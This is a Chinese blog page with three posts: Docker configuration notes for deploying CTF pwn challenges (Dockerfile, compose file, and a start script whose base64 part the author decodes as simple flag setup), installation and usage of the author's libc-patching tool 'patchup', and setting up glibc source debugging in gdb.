<h2 id="NAMES有些地方可以代替CONTAINER-ID"><a href="#NAMES有些地方可以代替CONTAINER-ID" class="headerlink" title="NAMES有些地方可以代替CONTAINER ID"></a>NAMES有些地方可以代替CONTAINER ID</h2><p>上面的命令我一直以为 CONTAINER ID要输入下面这个东西才行</p>
<p><img src="/../img/Ih2DLZlwiQbz1qu.png" alt="image-20220621182948850"></p>
<p>刚才我试了一下发现也可以输入NAMES来代替，也就是下面这个东西。</p>
<p><img src="/../img/OdYqF5tSKkEmwHM.png" alt="image-20220621183420059"></p>
<p>以启动这个glibc2.33的容器举例，重新启动docker的时候，输入 sudo docker start  glibc2.33即可。</p>
<h2 id="容器的重命名"><a href="#容器的重命名" class="headerlink" title="容器的重命名"></a>容器的重命名</h2><p>如果最开始创建容器的时候没有进行命名，那么就会随机给这个容器分配一个名字，之后可以通过下面这个命令给容器重命名（docker1为容器原本的名字，docker2为容器的新名字）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker rename docker1 docker2</span><br></pre></td></tr></table></figure>



<h2 id="docker的基本配置文件"><a href="#docker的基本配置文件" class="headerlink" title="docker的基本配置文件"></a>docker的基本配置文件</h2><p>在出题的时候，需要去部署一下docker，一般来说用那个ctf_xinetd项目是比较方便的，相关用法不做介绍了，网上一搜一堆。</p>
<p>主要是简单说一下几个配置文件的作用以及代码的简单分析</p>
<p>我找了之前出过的一个题目的docker文件，来解释一下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301122106949.png" alt="image-20230112210646788"></p>
<p>有以上几个基本的配置文件</p>
<h4 id="Dockerfile"><a href="#Dockerfile" class="headerlink" title="Dockerfile"></a>Dockerfile</h4><p>用于构建镜像的配置文件，里面包含了构建镜像所需的各种指令，如配置环境，安装软件，配置启动命令等。</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span> <span class="comment">#该指令告诉Docker我们要在基于Ubuntu 18.04镜像进行操作，如果你本地没有该镜像，Docker会去Docker hub上下载</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sed -i <span class="string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt-get install -y lib32z1 xinetd</span></span><br><span class="line"><span class="comment">#上述指令首先将ubuntu的镜像源替换为清华大学的镜像源，更换镜像源的目的是为了更快的下载软件包</span></span><br><span class="line"><span class="comment">#其次更新了系统软件包，确保系统是最新的状态</span></span><br><span class="line"><span class="comment">#最后安装libc32z1和xinetd两个软件包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m ctf <span class="comment">#创建名为ctf的用户，-m表示创建用户的同时创建用户的主目录</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /home/ctf <span class="comment">#将工作目录设置为/home/ctf</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">cp</span> -R /lib* /home/ctf &amp;&amp; \ </span></span><br><span class="line">    cp -R /usr/lib* /home/ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/dev &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/null c 1 3 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/zero c 1 5 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/random c 1 8 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">mknod</span> /home/ctf/dev/urandom c 1 9 &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 666 /home/ctf/dev/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/sh /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/ls /home/ctf/bin &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">cp</span> /bin/cat /home/ctf/bin</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./ctf.xinetd /etc/xinetd.d/ctf <span class="comment">#将本地的ctf.xinetd文件复制到容器的/etc/xinetd.d/ctf下</span></span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh <span class="comment">#将本地的start.sh文件复制到容器的根目录下</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&quot;Blocked by ctf_xinetd&quot;</span> &gt; /etc/banner_fail</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh <span class="comment">#给start.sh可执行权限</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./bin/ /home/ctf/</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R root:ctf /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> -R 750 /home/ctf &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chmod</span> 740 /home/ctf/flag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>] <span class="comment">#在容器启动时执行/start.sh文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9999</span> <span class="comment">#将容器的9999端口暴露出来</span></span><br></pre></td></tr></table></figure>

<p>上面出现的关键词如下：</p>
<ol>
<li><code>FROM</code>: 指定基础镜像。</li>
<li><code>RUN</code>: 在镜像中执行命令。</li>
<li><code>WORKDIR</code>: 指定工作目录。</li>
<li><code>COPY</code>: 从本地主机复制文件&#x2F;文件夹到容器。</li>
<li><code>CMD</code>: 容器启动时运行的命令。</li>
<li><code>EXPOSE</code>: 暴露容器的端口。</li>
</ol>
<p>关于这个 <code>EXPOSE 9999</code> ，指的是运行的服务可以通过9999端口进行访问，但这不意味着自动将容器的9999端口映射到主机端口，EXPOSE主要是让构建镜像的人和运行容器的人有一个明确的了解，这个容器上的端口哪些提供服务，并且如果需要的话可以运行容器的时候把这些端口映射到主机端口上。当然，这不算强制的，这只是一个建议或者提示，依然可以不按照EXPOSE声明的端口来使用，你可以使用自己需要的端口映射容器端口到主机上。</p>
<h4 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h4><p>该文件用来配置和启动多容器Docker应用程序的配置文件，可以在一个文件中定义所有容器，并在所有容器之间定义连接。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">version: &#x27;3&#x27;	 #指定了Docker Compose文件格式的版本</span><br><span class="line"></span><br><span class="line">services:  		 #    定义了一个服务部署的集合</span><br><span class="line">    pwn:		 #	 定义了一个名为pwn的服务</span><br><span class="line">        build: ./ #   指定了Docker Compose应该使用当前目录下的Dockerfile来构建镜像</span><br><span class="line">        image: pwn #  镜像的名称为pwn</span><br><span class="line">        ports:</span><br><span class="line">            - &quot;8888:9999&quot;  #将容器中的9999端口映射到主机的8888端口</span><br><span class="line">        pids_limit: 1024</span><br><span class="line">        # cpus: 0.5</span><br><span class="line">        container_name: pwn #容器的名称为pwn</span><br><span class="line">        restart: unless-stopped</span><br><span class="line">        # privileged: true</span><br></pre></td></tr></table></figure>



<h4 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h4><p>主要在构建完镜像后运行在容器中的脚本，用于在容器启动时进行初始化操作。可以在Dockerfile文件中配置其作为容器启动时的入口点，从而完成一些必要的配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"># Add your startup script</span><br><span class="line">echo dXNlcj1gbHMgL2hvbWVgCmlmIFsgISAkREFTRkxBRyBdO3RoZW4KIGVjaG8gZmxhZ3tURVNUX0RBU0ZMQUd9fHRlZSAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmVsc2UKIGVjaG8gJERBU0ZMQUd8dGVlIC9ob21lLyR1c2VyL2ZsYWcgL2ZsYWcKZmkKY2hvd24gcm9vdDokdXNlciAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCmNobW9kIDc0MCAvaG9tZS8kdXNlci9mbGFnIC9mbGFnCg==|base64 -d|sh;</span><br><span class="line"># DO NOT DELETE</span><br><span class="line">/etc/init.d/xinetd start; #启动xinetd服务</span><br><span class="line">sleep infinity;</span><br></pre></td></tr></table></figure>

<p>上面是被base64编码过了，然后解码之后内容如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">user=`ls /home`</span><br><span class="line">if [ ! $DASFLAG ];then</span><br><span class="line"> echo flag&#123;TEST_DASFLAG&#125;|tee /home/$user/flag /flag</span><br><span class="line">else</span><br><span class="line"> echo $DASFLAG|tee /home/$user/flag /flag</span><br><span class="line">fi</span><br><span class="line">chown root:$user /home/$user/flag /flag</span><br><span class="line">chmod 740 /home/$user/flag /flag</span><br></pre></td></tr></table></figure>

<p>这里是设置的动态flag</p>
<p>这样将docker环境打包好后，直接输入 <code>docker compose up -d </code> 命令，即可自动部署。</p>
<p><strong>当你使用docker compose up 命令启动容器时，Docker Compose会读取docker-compose.yml文件并使用Dockerfile构建镜像，然后根据文件中配置启动容器，并执行start.sh脚本。，容器启动后，就可以通过指定的端口访问容器中运行的应用或服务。</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/853f1673.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/853f1673.html" class="post-title-link" itemprop="url">patchup--命令行小工具</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:47:25" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%B0%9D%E8%AF%95%E5%BC%80%E5%8F%91%E5%B0%8F%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">尝试开发小工具</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="patchup"><a href="#patchup" class="headerlink" title="patchup"></a>patchup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该工具是我自用的一个小工具（针对于做pwn题的辅助工具）（本工具的实现非常简单，而且这个工具的核心是依赖patchelf和glibc-all-in-one这两个工具），用于快速修改本地<code>ELF</code>文件的libc使其与远程服务器那边所运行的程序依赖的<code>libc</code>库一样<br>从而避免了因为 <code>libc</code> 问题，而导致本地打通了但是远程没打通的尴尬情况。因为每次都手动 <code>patch libc</code> 的过程太过于重复，而且有概率出错，同时受到了<br><code>roderick</code> 师傅写的 <code>pwncli</code> 的启发，于是就有自己写一个命令行工具的想法。<br>如果你想看施工现场，请见 <a target="_blank" rel="noopener" href="https://github.com/ZIKH26/patchup">github仓库</a></p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>由于这个小工具依赖的核心依然是 <code>patchelf</code> 和 <code>glibc-all-in-one</code> ，能让它以命令行工具的身份出现，还少不了python中的 <code>click</code> 模块。<br>因此你应该有如下东西 <code>patchelf</code>   <code>glibc-all-in-one</code> ，如果有的话请直接看下面的 <a href="#install-patchup">install patchup</a> 部分，如果没有的话下文就是相关部署。</p>
<h3 id="install-patchelf"><a href="#install-patchelf" class="headerlink" title="install patchelf"></a>install patchelf</h3><h4 id="直接使用预编译的二进制文件"><a href="#直接使用预编译的二进制文件" class="headerlink" title="直接使用预编译的二进制文件"></a>直接使用预编译的二进制文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/NixOS/patchelf/releases/download/0.14.5/patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line">tar -xzvf patchelf-0.14.5-x86_64.tar.gz</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">sudo <span class="built_in">mv</span> patchelf /bin/patchelf</span><br></pre></td></tr></table></figure>

<h4 id="手动编译-patchelf"><a href="#手动编译-patchelf" class="headerlink" title="手动编译 patchelf"></a>手动编译 patchelf</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line"><span class="comment"># 安装autoreconf</span></span><br><span class="line">sudo apt install -y autoconf</span><br><span class="line"><span class="comment"># 赋予执行权限</span></span><br><span class="line"><span class="built_in">chmod</span> +x bootstrap.sh</span><br><span class="line"><span class="comment"># 使用预设脚本配置编译环境</span></span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>



<h3 id="install-glibc-all-in-one"><a href="#install-glibc-all-in-one" class="headerlink" title="install glibc-all-in-one"></a>install glibc-all-in-one</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one</span><br><span class="line"><span class="built_in">mkdir</span> libs</span><br><span class="line"><span class="built_in">chmod</span> +x  extract  update_list download</span><br><span class="line">./update_list</span><br></pre></td></tr></table></figure>

<p>cd 到上级目录</p>
<h2 id="install-patchup"><a href="#install-patchup" class="headerlink" title="install patchup"></a>install patchup</h2><p>ok，假设你现在有了 <code>patchelf</code> 和 <code>glibc-all-in-one</code>  那么你就可以输入以下命令来安装 <code>patchup</code> 这个小工具了 </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/polishing-labs/patchup.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> patchup</span><br><span class="line"></span><br><span class="line">sudo pip install --editable .</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以输入patchup –help命令查看帮助，如果出现下面图片所展示的内容，则说明安装成功。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>
<img width="544" alt="image" src="https://user-images.githubusercontent.com/93199623/168457093-d3019f95-8ec7-4dd1-bea6-ea7222e77533.png">





<p>最后目录结构应该如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glibc-all-in-one（目录）</span><br><span class="line">patchelf（目录）</span><br><span class="line">patchup</span><br><span class="line">	├── patchup.py(仓库文件)</span><br><span class="line">	└── setup.py(仓库文件</span><br></pre></td></tr></table></figure>


<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>假设你有一个 名为 <code>demo</code>  ELF 文件,他现在默认的 <code>libc</code> 库是 <code>2.27</code> 的，但是服务器那边的这个程序所依赖的 <code>libc</code> 库是2.23的<br>那么你就可以使用以下命令，去为你的ELF文件patch一个 <code>2.23</code> 的 <code>libc</code> 库。（<code>-b</code> 是备份的意思，建议每次使用 <code>patchup</code> 时都开启该选项,<code>-c</code>是自主选择小版本libc的选项，开启这个选项你可以选择小版本不同的<code>2.23</code>的<code>libc</code>库，如果不开启，则默认是匹配到2.23版本的第一个<code>libc</code>库）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchup demo 2.23 -b</span><br></pre></td></tr></table></figure>
<img width="965" alt="image" src="https://user-images.githubusercontent.com/93199623/167239931-d6266ea8-5ee6-4dde-9037-a20ae9e73069.png">

<h3 id="glibc-all-in-one中没有所需要的libc"><a href="#glibc-all-in-one中没有所需要的libc" class="headerlink" title="glibc-all-in-one中没有所需要的libc"></a>glibc-all-in-one中没有所需要的libc</h3><p>假设你的 <code>glibc-all-in-one</code> 中空空如也（没有所需要的libc版本），别担心，你依旧可以输入上面的命令。<code>patchup</code> 将会为你自动下载（如果你需要的话）效果如下：<br><img width="1149" alt="image" src="https://user-images.githubusercontent.com/93199623/167242074-a6b3d411-af5d-4444-b9f4-acec16667e94.png"></p>
<p>此时 <code>match_libc_success_match</code> 展示了当前可以下载的libc版本，你可以输入下面索引来选择它们（第一个索引是0，第二个索引是1，以此类推）<br><img width="1145" alt="image" src="https://user-images.githubusercontent.com/93199623/167242133-464207ad-6416-4cc1-859f-32ebca40ff7b.png"><br>等待下载成功后，将自动进行 <code>patch</code>（如果不想下载的话，可以输入q退出）</p>
<h3 id="使用题目指定的libc库"><a href="#使用题目指定的libc库" class="headerlink" title="使用题目指定的libc库"></a>使用题目指定的libc库</h3><p>如果题目给定了一个libc库，别担心 <code>patchup</code> 依旧会正常工作，<code>patchup</code> 将会去寻找相应匹配的 <code>ld</code>，如果有的话则会直接链接，<br><img width="966" alt="image" src="https://user-images.githubusercontent.com/93199623/167242830-9cf871bb-e025-4c51-9fca-c3d78f462924.png"></p>
<p>没有的话则会自动下载（如果你需要的话），如下图<br><img width="1150" alt="image" src="https://user-images.githubusercontent.com/93199623/167242865-c6a01d64-1c9f-415b-aa18-5428821d0a15.png"></p>
<p>值得一提的就是，我碰见过使用<code>patchup</code>之后<code>patch</code>指定<code>libc</code>是失败的，不过我检查了一下发现这并不是<code>patchup</code>的问题，应该是<code>patchelf</code>出了点<code>bug</code>，所以碰到这种情况，可以换成<code>glibc-all-in-one</code>中版本一样的<code>libc</code>库试试。</p>
<h2 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h2><p>尽管本工具异常的简单，但是对于我这个不太聪明的大一学生来说，写的过程也并不一帆风顺。感谢 Roderick 师傅带给我的启发以及解答一些我的困惑，也感谢我的队员 <a href="www.timochan.cn">Timochan</a> , 如果没有他，关于这个工具在其他主机上的一些环境部署我可能无法实现</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/c5c57579.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/c5c57579.html" class="post-title-link" itemprop="url">关于gdb源码调试环境搭建</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:46:39" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url" rel="index"><span itemprop="name">环境搭建</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>有时候我们要去追踪一些函数或是数据，需要用gdb动态调试并去结合着源码分析。下面介绍一下gdb源码调试的环境如何搭建</p>
<h2 id="glibc源码下载"><a href="#glibc源码下载" class="headerlink" title="glibc源码下载"></a>glibc源码下载</h2><p>glibc源码可以在下面这个链接下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://launchpad.net/ubuntu/+source/glibc/</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220415172522191-1508848149.png"></p>
<p>选择需要的glibc版本，我以2.27-3ubuntu 1.5为例</p>
<p><img src="/../img/2706180-20220415172035738-582520439.png" alt="image-20220415164406215"></p>
<p>选择这个最大的文件，下载。</p>
<p>然后拖到ubuntu里面解压</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -xf filename</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220415172035504-1672278744.png" alt="image-20220415164603510"></p>
<p>新建一个大的文件夹，用来存放各个版本的glibc，然后进入新下载的glibc，ls看一下发现东西都在里面。然后我们需要去找源码所在的文件夹。</p>
<p><img src="/../img/2706180-20220415172035082-1039167232.png" alt="image-20220415164836238"></p>
<h2 id="找一下函数所在的源文件"><a href="#找一下函数所在的源文件" class="headerlink" title="找一下函数所在的源文件"></a>找一下函数所在的源文件</h2><p>比如我现在想进行exit源码调试，先去下面这个网站搜一下exit源码在哪个文件里面。</p>
<p><a target="_blank" rel="noopener" href="https://code.woboq.org/">在线查看源码网站</a></p>
<p><img src="/../img/2706180-20220415172618725-1985569220.png"></p>
<p>进去之后，搜索想找的函数，然后就可以看到它所在的文件。发现exit.c在stdlib文件中。</p>
<p><img src="/../img/2706180-20220415172034631-573661594.png" alt="image-20220415165453694"></p>
<p>我们去看一下，果然是在stdlib中发现了exit.c</p>
<p><img src="/../img/2706180-20220415172716344-725839155.png"></p>
<h2 id="配置-gdbinit"><a href="#配置-gdbinit" class="headerlink" title="配置.gdbinit"></a>配置.gdbinit</h2><p>然后pwd，复制一下路径。</p>
<p><img src="/../img/2706180-20220415172034380-1120493636.png" alt="image-20220415165737197"></p>
<p>然后去用户目录下输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .gdbinit</span><br></pre></td></tr></table></figure>

<p>然后输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span>  刚才复制的路径</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="/../img/2706180-20220415172033716-637621406.png" alt="image-20220415170846971"></p>
<p>最后保存一下就ok了。</p>
<p>然后gdb继续调试elf程序即可，等进入你装载进去的文件之后，就会自动展示glibc源代码。</p>
<h2 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a>最后效果</h2><p>效果如下：</p>
<p><img src="/../img/2706180-20220415172032901-1046593594.png" alt="image-20220415171511841"></p>
<p>PS：如果调试其他函数没有出现源码，就说明没有导入成功对应的代码源文件，另外就是调试不同的程序，对应的glibc版本不要选错了。</p>
<p>参考博客：</p>
<p><a target="_blank" rel="noopener" href="http://taqini.space/2020/11/01/glibc-debug-pwndbg/#Glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">Glibc源码调试环境搭建 | TaQini</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" title="上一页" aria-label="上一页" href="/page/3/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" title="下一页" aria-label="下一页" href="/page/5/"><i class="fa fa-angle-right"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2023</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZIKH26</span>
  </div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  






  





</body>
</html>
